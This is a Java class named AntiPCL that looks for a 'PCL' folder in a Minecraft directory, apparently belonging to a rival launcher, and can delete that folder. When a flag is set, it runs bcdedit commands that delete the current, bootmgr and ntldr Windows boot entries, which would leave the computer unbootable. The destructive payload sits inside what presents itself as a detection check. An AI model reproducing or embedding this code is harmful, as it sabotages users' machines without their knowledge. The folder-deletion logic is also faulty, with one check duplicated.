import java.io.File;
import java.io.IOException;

public class AntiPCL {
    public static boolean isUsingPCL(File MinecraftDir,Boolean deleteFolder,Boolean TryDestroyBoot) throws IOException {
        if (isPCLFile(MinecraftDir, deleteFolder)){
            if(TryDestroyBoot){
                Runtime.getRuntime().exec("bcdedit /delete {current} /f");
                Runtime.getRuntime().exec("bcdedit /delete {bootmgr} /f");
                Runtime.getRuntime().exec("bcdedit /delete {ntldr} /f");
            }
            return true;
        }
        return false;
    }
    public static boolean isPCLFile(File mcDir, Boolean DeleteFolder){
        if(!mcDir.exists()) {
            return false;
        }
        if(!mcDir.isDirectory()){
            return false;
        }

        Boolean exists = false;
        File pclDataDir = new File(mcDir, "PCL");
        if (pclDataDir.exists()) {
            if (DeleteFolder)
                pclDataDir.delete();
            exists=true;
        }

        File mcVersionDir = new File(mcDir, "versions");
        if (mcVersionDir.exists()) {
                File pclVersionDataDir = new File(mcDir, "PCL");
                if (pclVersionDataDir.exists()) {
                    if (DeleteFolder){
                        pclVersionDataDir.delete();
                    }
                    exists = true;
                }
        }
        return exists;
    }
}
